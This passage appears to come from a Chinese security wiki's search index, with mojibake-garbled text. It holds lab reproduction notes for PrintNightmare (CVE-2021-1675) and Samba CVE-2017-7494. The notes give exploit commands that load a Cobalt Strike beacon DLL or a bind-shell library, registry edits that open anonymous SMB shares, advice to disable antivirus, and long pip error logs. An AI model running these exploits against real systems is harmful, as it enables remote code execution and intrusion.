&quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot; /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /fREG ADD &quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot; /v RestrictAnonymous /t REG_DWORD /d 0 /f å¯èƒ½ä¼šå‡ºç°æç¤ºè¦†ç›–ï¼Œé‚£å°±Yes powershellé‚£å¥åœ¨win 7ã€server2008ç™»ç³»ç»Ÿä¼šæŠ¥é”™win7éœ€è¦å¯¹C:\\shareå³é”®ï¼Œå±æ€§ï¼Œåœ¨å¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­å•å‡»â€œå…±äº«â€æŒ‰é’®ï¼Œç„¶åå°†Everyoneæ·»åŠ è¿›å»ï¼Œå†ç‚¹å‡»â€œå…±äº«â€æŒ‰é’®å¾…å†™ æ¼æ´åˆ©ç”¨ ä¸‹è½½expè„šæœ¬CVE-2021-1675 1git clone https://github.com/cube0x0/CVE-2021-1675.git 12345678910111213141516171819202122232425usage: CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target shareCVE-2021-1675 implementation.positional arguments: target [[domain/]username[:password]@]&lt;targetName or address&gt; share Path to DLL. Example &#x27;\\\\10.10.10.10\\share\\evil.dll&#x27;optional arguments: -h, --help show this help message and exitauthentication: -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASHconnection: -target-ip ip address IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it -port [destination port] Destination port to connect to SMB ServerExample;./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 &#x27;\\\\192.168.1.215\\smb\\addCube.dll&#x27;./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 &#x27;C:\\addCube.dll&#x27; å‚æ•°ï¼š åŸŸçš„FQDN åŸŸå†…æ™®é€šç”¨æˆ·çš„è´¦å·å’Œå¯†ç  æ‰“å‡»ç›®æ ‡ æ¶æ„dllçš„è·¯å¾„ï¼ˆåŒ¿åSMBå…±äº«æ–‡ä»¶å¤¹oræœ¬åœ°è·¯å¾„ï¼‰ httpæœåŠ¡è·¯å¾„çš„æ–‡ä»¶ä¸è¡Œï¼Œè¯•è¿‡äº†ã€‚å› ä¸ºå’Œæ¼æ´åˆ©ç”¨è¿‡ç¨‹æœ‰å…³ é€šè¿‡åŒ¿åSMBå…±äº«æ–‡ä»¶å¤¹åŠ è½½æ¶æ„dllåŠ è½½æœ¬åœ°è·¯å¾„çš„æ–‡ä»¶1python3 CVE-2021-1675.py mytest.local/test02:test02@192.168.147.140 &#x27;\\\\192.168.147.138\\share\\beacon.dll&#x27;1python3 CVE-2021-1675.py mytest.local/test02:test02@192.168.147.140 &#x27;C:\\share\\beacon.dll&#x27; åŠ è½½æœ¬åœ°è·¯å¾„çš„æ–‡ä»¶åœ¨å®é™…åœºæ™¯ä¸­ï¼Œè¦å…ˆä¸Šä¼ æ–‡ä»¶åˆ°é¶æœºï¼ˆå·²æœ‰ç›®æ ‡çš„æƒé™ï¼‰ï¼Œç›¸å½“äºæ‹¿è¿™ä¸ªRCEå½“LPEç”¨äº† æ‰§è¡Œæƒ…å†µ SMBåŒ¿åå…±äº« ç›®æ ‡ rpcdumpæ£€æµ‹æƒ…å†µ exploitæˆåŠŸä¸å¦ server2016 dc å›æ˜¾MS-RPRNå’ŒMS-PAR æˆåŠŸï¼Œcsä¸Šçº¿ win10ï¼ˆWDå…³é—­ï¼‰ å›æ˜¾MS-RPRNå’ŒMS-PAR æˆåŠŸï¼Œcsä¸Šçº¿ win10ï¼ˆWDå¼€å¯ï¼‰ å¤±è´¥ï¼ŒERROR_VIRUS_INFECTED win7 å›æ˜¾MS-RPRN å¤±è´¥ï¼Œæ˜¾ç¤º[-] Connection Failed win7 dc å›æ˜¾MS-RPRNå’ŒMS-PAR æˆåŠŸï¼Œcsä¸Šçº¿ win10ï¼ˆWDå…³é—­ï¼‰ å›æ˜¾MS-RPRNå’ŒMS-PAR æˆåŠŸï¼Œcsä¸Šçº¿ server2016 å›æ˜¾MS-RPRNå’ŒMS-PAR æˆåŠŸï¼Œcsä¸Šçº¿ troubleshooting code: 0x5 - rpc_s_access_denied åŸå› ä¸€ï¼šDCæ˜¯server2012ï¼Œè‡³äºserv2012å½“DCä¸ºä»€ä¹ˆä¸è¡Œå°±ä¸æ¸…æ¥šäº†ã€‚å½“æ—¶è¯•expæ²¡è¯•å‡ºæ¥ï¼Œç¿»åˆ°è¿™ä¸ªç½‘é¡µè´´äº†ä¸€å¼ å›¾è¯´serv2012å½“DCä¸è¡Œã€‚githubï¼Œissue9ä¹Ÿæœ‰è¿™ä¸ªé—®é¢˜çš„åé¦ˆissue#9_impacket.dcerpc.v5.rpcrt.DCERPCException: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied åŸå› äºŒï¼šæ’é™¤äº†dcæ˜¯server2012åï¼Œå¦‚æœè¿˜æ˜¯rpc access deniedï¼Œå¯ä»¥è¯•ä¸‹æœ¬åœ°è·¯å¾„çš„dllåˆ©ç”¨ 1python3 CVE-2021-1675.py mytest.local/test02:test02@192.168.147.137 &#x27;C:\\share\\beacon.dll&#x27; æ¥è¯´æ˜é¶æœºæœªä¿®å¤è¿™ä¸ªæ´ï¼Œæ˜¯smbåŒ¿åå…±äº«çš„é—®é¢˜ expåˆ©ç”¨æ—¶å›æ˜¾[-] Connection Failed æƒ…å†µ è§£å†³åŠæ³• rpcdumpæ‰«å›æ˜¾MS-RPRNå’ŒMS-PARï¼Œèƒ½pingé€š æŠŠé˜²ç«å¢™å…³äº† ç›®æ ‡win7ï¼Œrpcdumpæ‰«å›æ˜¾MS-RPRNï¼Œé˜²ç«å¢™ä¹Ÿå…³äº† ä¸æ¸…æ¥šï¼Œæˆ‘çš„å®éªŒç¯å¢ƒå¯¹win7æ²¡exploitæˆåŠŸ ERROR_VIRUS_INFECTED è§£å†³åŠæ³•ï¼šå…³é—­æ€è½¯ issue#46 ERROR_VIRUS_INFECTED - Operation did not complete successfully because the file contains a virus or potentially unwanted software. å‚è€ƒé“¾æ¥ å‚è€ƒé“¾æ¥ğŸ”— å¤‡æ³¨ CVE-2021-1675 expå·¥å…· PrintNightmare(CVE-2021-1675/CVE-2021-34527)å¤ç° å¤ç°å‚è€ƒæ–‡ç« "},{"title":"æ–‡ç« æ¨¡æ¿","path":"/wiki/vuln_reproduction/æ–‡ç« æ¨¡æ¿_æ¼æ´å¤ç°.html","content":"æ¼æ´ä¿¡æ¯ åç§°/ç¼–å· å½±å“èŒƒå›´ å·²å¤ç°ç‰ˆæœ¬ æµ‹ä¸é€šçš„ç‰ˆæœ¬ æ¼æ´å¤ç° ç¯å¢ƒæ‹“æ‰‘ è™šæ‹Ÿæœº ip ç‰ˆæœ¬ é¶æœºç¯å¢ƒè¦æ±‚ å‚è€ƒé“¾æ¥ å‚è€ƒé“¾æ¥ğŸ”— å¤‡æ³¨"},{"title":"Samba CVE-2017-7494","path":"/wiki/vuln_reproduction/Samba_CVE-2017-7494.html","content":"æ¼æ´ä¿¡æ¯ åç§°/ç¼–å· å½±å“èŒƒå›´ å·²å¤ç°ç‰ˆæœ¬ æµ‹ä¸é€šçš„ç‰ˆæœ¬ CVE-2017-7494 4.6.3(vulhubçš„) gptï¼Œå¾…è€ƒè¯ï¼šCVE-2017-7494 å½±å“çš„ Samba ç‰ˆæœ¬æ˜¯ 3.5.0 è‡³ 4.5.4/4.5.10/4.4.14 æ¼æ´å¤ç° ç¯å¢ƒæ‹“æ‰‘ è™šæ‹Ÿæœº ip Ubuntu(è£…æœ‰vulhub) 192.168.147.134 æ”»å‡»æœºkali ä½¿ç”¨vulhubä¸­çš„sambaä½œä¸ºé¶æœºç¯å¢ƒ é¶æœºç¯å¢ƒå®‰è£… å®‰è£…docker å®‰è£…docker-compose docker-compostæ˜¯ä¸€ä¸ªå•ç‹¬å·¥å…·ï¼Œè¦ç‹¬ç«‹å®‰è£… aptæ–¹å¼å®‰è£…æ‰‹åŠ¨ä¸‹è½½äºŒè¿›åˆ¶æ–‡ä»¶æ–¹å¼å®‰è£…12sudo apt updatesudo apt install docker-composecurlæ–¹å¼ä¸‹è½½1sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/bin/docker-compose æˆ–åˆ°githubçš„releaseä¸­ä¸‹è½½æ‹–è¿›è™šæ‹Ÿæœºï¼Œæ”¾åˆ°/usr/bin/ 1sudo mv docker-compose /usr/bin/docker-compose èµ‹äºˆdocker-compostå¯æ‰§è¡Œæƒé™1sudo chmod +x /usr/bin/docker-compose éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸ1docker-compose --version ä¸‹è½½vulhubé•œåƒ 1git clone https://github.com/vulhub/vulhub.git å¯åŠ¨Sambaç¯å¢ƒ 1sudo docker-compose up -d expè¿è¡Œç¯å¢ƒ ä¸‹è½½exp expæ˜¯python2å†™çš„ï¼Œåœ¨kaliä¸­å®‰è£…Python 2å’Œpipï¼ˆPython 2çš„ï¼‰ 12sudo apt updatesudo apt install python2 12curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.pysudo python2 get-pip.py å®‰è£…expç›¸å…³çš„ä¾èµ– 1sudo python2 -m pip install -r requirements.txt æ¼æ´åˆ©ç”¨ Exploitâ€™s arguments explained: 12usage: exploit.py [-h] -t TARGET -e EXECUTABLE -s REMOTESHARE -r REMOTEPATH [-u USER] [-p PASSWORD] [-P REMOTESHELLPORT] -t or â€”target - Set the remote host to attack. -e or â€”executable - Set the path on your local system where the lib that you want to load is located. -s or â€”remoteshare - Remote share where the file will be copied. -r or â€”remotepath - Where the file is located on the remote system. -u or â€”user - Username to log in with. -p or â€”password - Password to use to log in with. -P or â€”remoteshellport - If you are using a bind shell payload, connect to the payload after the attack is executed. expåˆ©ç”¨æ•ˆæœï¼šåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œ/home/share/libbindshell-samba.so å‚æ•°ï¼š -tï¼šé¶æœºip -eï¼šè¦æ‰§è¡Œçš„.soæ–‡ä»¶ -sï¼šç›®æ ‡Sambaå…±äº«ç›®å½• -uï¼Œ-pï¼šç”¨æˆ·åå’Œå¯†ç ï¼ŒåŒ¿åsmbçš„è¯å¯ä»¥ä»»æ„å¡«å†™ å…¶ä¸­myshareæ˜¯åˆ†äº«åç§°ï¼ˆåœ¨vulhubä¸­ä¸ºmyshareï¼‰ï¼Œè€Œ/home/shareæ˜¯å¯¹åº”çš„å¯å†™ç›®å½•ã€‚-uå’Œ-pç”¨æ¥æŒ‡å®šç”¨æˆ·åã€å¯†ç ï¼Œå½“å‰ç¯å¢ƒæ˜¯ä¸€ä¸ªåŒ¿åsmbï¼Œæ‰€ä»¥å¡«å†™ä»»æ„ä¿¡æ¯å‡å¯ã€‚ å› ä¸ºlibbindshell-samba.soæ˜¯ä¸€ä¸ªbindshellï¼Œç›‘å¬åœ°å€æ˜¯6699ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡-PæŒ‡å®šè¿™ä¸ªç«¯å£ã€‚åœ¨å®é™…æ¸—é€ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹libbindshell-samba.cï¼Œå†™å…¥ä»»æ„å…¶ä»–ä»£ç ï¼Œå¦‚åå¼¹shellï¼Œé¿å…ä½¿ç”¨bindshell Samba è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-7494ï¼‰ 1python2 exploit.py -t 192.168.147.134 -e libbindshell-samba.so -s myshare -r /home/share/libbindshell-samba.so -u guest -p guest -P 6699 pipå®‰è£…ä¾èµ–æ—¶é‡åˆ°çš„æŠ¥é”™ setuptoolsåŒ…çš„é—®é¢˜ 1234567891011121314151617â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/exploit-CVE-2017-7494-master]â””â”€$ sudo python2 -m pip install -r requirements.txtDEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality. Collecting git+https://github.com/opsxcq/impacket.git (from -r requirements.txt (line 2)) Cloning https://github.com/opsxcq/impacket.git to /tmp/pip-req-build-Gd1w9Q Running command git clone -q https://github.com/opsxcq/impacket.git /tmp/pip-req-build-Gd1w9Q ERROR: Command errored out with exit status 1: command: /usr/bin/python2 -c &#x27;import sys, setuptools, tokenize; sys.argv[0] = &#x27;&quot;&#x27;&quot;&#x27;/tmp/pip-req-build-Gd1w9Q/setup.py&#x27;&quot;&#x27;&quot;&#x27;; __file__=&#x27;&quot;&#x27;&quot;&#x27;/tmp/pip-req-build-Gd1w9Q/setup.py&#x27;&quot;&#x27;&quot;&#x27;;f=getattr(tokenize, &#x27;&quot;&#x27;&quot;&#x27;open&#x27;&quot;&#x27;&quot;&#x27;, open)(__file__);code=f.read().replace(&#x27;&quot;&#x27;&quot;&#x27;\\r &#x27;&quot;&#x27;&quot;&#x27;, &#x27;&quot;&#x27;&quot;&#x27; &#x27;&quot;&#x27;&quot;&#x27;);f.close();exec(compile(code, __file__, &#x27;&quot;&#x27;&quot;&#x27;exec&#x27;&quot;&#x27;&quot;&#x27;))&#x27; egg_info --egg-base /tmp/pip-pip-egg-info-KLPswK cwd: /tmp/pip-req-build-Gd1w9Q/ Complete output (7 lines): /usr/share/cffi-wheels/setuptools-44.1.0-py2.py3-none-any.whl/setuptools/dist.py:476: UserWarning: Normalizing &#x27;0.9.16-dev&#x27; to &#x27;0.9.16.dev0&#x27; usage: setup.py [global_opts] cmd1 [cmd1_opts] [cmd2 [cmd2_opts] ...] or: setup.py --help [cmd1 cmd2 ...] or: setup.py --help-commands or: setup.py cmd --help error: invalid command &#x27;egg_info&#x27; è§£å†³åŠæ³•ï¼š æ›´æ–°æˆ–å®‰è£… setuptoolsï¼Œç„¶åé‡æ–°å®‰è£…ä¾èµ– 1sudo python2 -m pip install --upgrade setuptools 1sudo python2 -m pip install -r requirements.txt Pythonçš„å¼€å‘åŒ…çš„é—®é¢˜ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/exploit-CVE-2017-7494-master]â””â”€$ sudo python2 -m pip install -r requirements.txt DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality. Collecting git+https://github.com/opsxcq/impacket.git (from -r requirements.txt (line 2)) Cloning https://github.com/opsxcq/impacket.git to /tmp/pip-req-build-XarPcL Running command git clone -q https://github.com/opsxcq/impacket.git /tmp/pip-req-build-XarPcLCollecting pycrypto==2.6 Downloading pycrypto-2.6.tar.gz (443 kB) |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 443 kB 922 kB/s Collecting pyasn1 Downloading pyasn1-0.5.1-py2.py3-none-any.whl (84 kB) |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 84 kB 416 kB/s Building wheels for collected packages: pycrypto, impacket Building wheel for pycrypto (setup.py) ... error ERROR: Command errored out with exit status 1: command: /usr/bin/python2 -u -c &#x27;import sys, setuptools, tokenize; sys.argv[0] = &#x27;&quot;&#x27;&quot;&#x27;/tmp/pip-install-lukwux/pycrypto/setup.py&#x27;&quot;&#x27;&quot;&#x27;; __file__=&#x27;&quot;&#x27;&quot;&#x27;/tmp/pip-install-lukwux/pycrypto/setup.py&#x27;&quot;&#x27;&quot;&#x27;;f=getattr(tokenize, &#x27;&quot;&#x27;&quot;&#x27;open&#x27;&quot;&#x27;&quot;&#x27;, open)(__file__);code=f.read().replace(&#x27;&quot;&#x27;&quot;&#x27;\\r &#x27;&quot;&#x27;&quot;&#x27;, &#x27;&quot;&#x27;&quot;&#x27; &#x27;&quot;&#x27;&quot;&#x27;);f.close();exec(compile(code, __file__, &#x27;&quot;&#x27;&quot;&#x27;exec&#x27;&quot;&#x27;&quot;&#x27;))&#x27; bdist_wheel -d /tmp/pip-wheel-chcgDk cwd: /tmp/pip-install-lukwux/pycrypto/ Complete output (211 lines): running bdist_wheel running build running build_py creating build creating build/lib.linux-x86_64-2.7 creating build/lib.linux-x86_64-2.7/Crypto copying lib/Crypto/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto copying lib/Crypto/pct_warnings.py -&gt; build/lib.linux-x86_64-2.7/Crypto creating build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/MD4.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA384.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA256.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA512.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/MD5.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/RIPEMD.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/MD2.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/HMAC.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/hashalgo.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA224.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash creating build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/blockalgo.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/ARC2.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/CAST.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/DES3.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/PKCS1_OAEP.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/PKCS1_v1_5.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/DES.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/XOR.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/AES.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/ARC4.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/Blowfish.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher creating build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/randpool.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/asn1.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/Counter.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/py21compat.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/RFC1751.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/number.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/_number_new.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/winrandom.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/py3compat.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util creating build/lib.linux-x86_64-2.7/Crypto/Random copying lib/Crypto/Random/_UserFriendlyRNG.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random copying lib/Crypto/Random/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random copying lib/Crypto/Random/random.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random creating build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna copying lib/Crypto/Random/Fortuna/SHAd256.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna copying lib/Crypto/Random/Fortuna/FortunaGenerator.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna copying lib/Crypto/Random/Fortuna/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna copying lib/Crypto/Random/Fortuna/FortunaAccumulator.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna creating build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/posix.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/fallback.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/rng_base.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/nt.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG creating build/lib.linux-x86_64-2.7/Crypto/SelfTest copying lib/Crypto/SelfTest/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest copying lib/Crypto/SelfTest/st_common.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_ARC2.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_AES.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_ARC4.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_XOR.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_Blowfish.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_CAST.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_pkcs1_15.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_pkcs1_oaep.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/common.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_DES.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_DES3.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_MD4.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA512.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA224.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_MD2.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_HMAC.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA384.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/common.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_RIPEMD.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA256.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_MD5.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/test_chaffing.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/test_KDF.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/test_rfc1751.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/test_AllOrNothing.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/test_RSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/test_ElGamal.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/test_DSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/test_importKey.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random copying lib/Crypto/SelfTest/Random/test_rpoolcompat.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random copying lib/Crypto/SelfTest/Random/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random copying lib/Crypto/SelfTest/Random/test_random.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna copying lib/Crypto/SelfTest/Random/Fortuna/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna copying lib/Crypto/SelfTest/Random/Fortuna/test_FortunaAccumulator.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna copying lib/Crypto/SelfTest/Random/Fortuna/test_FortunaGenerator.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna copying lib/Crypto/SelfTest/Random/Fortuna/test_SHAd256.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_fallback.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_posix.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_winrandom.py -&gt; 